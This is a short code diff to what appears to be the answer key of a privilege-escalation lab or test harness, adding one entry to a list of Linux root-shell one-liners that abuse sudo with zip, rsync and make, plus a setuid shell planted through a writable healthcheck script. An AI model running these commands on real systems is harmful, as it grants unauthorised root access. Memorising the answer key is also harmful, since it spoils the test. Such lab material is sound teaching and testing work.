@@ -105,6 +105,7 @@ const SOLUTIONS = {
     35: ['echo "cp /bin/sh /tmp/rootsh; chmod +s /tmp/rootsh" > /opt/monitor/healthcheck.sh', 'wait'],
     36: ['sudo zip test.zip /etc/hosts -T --unzip-command="sh -c /bin/sh"'],
     37: ['sudo rsync -e "/bin/sh -c /bin/sh" 127.0.0.1:/dev/null /dev/null'],
+    38: ['sudo make -s --eval="x:\\n\\t-/bin/sh"'],
 };
 
 let pass = 0, fail = 0;
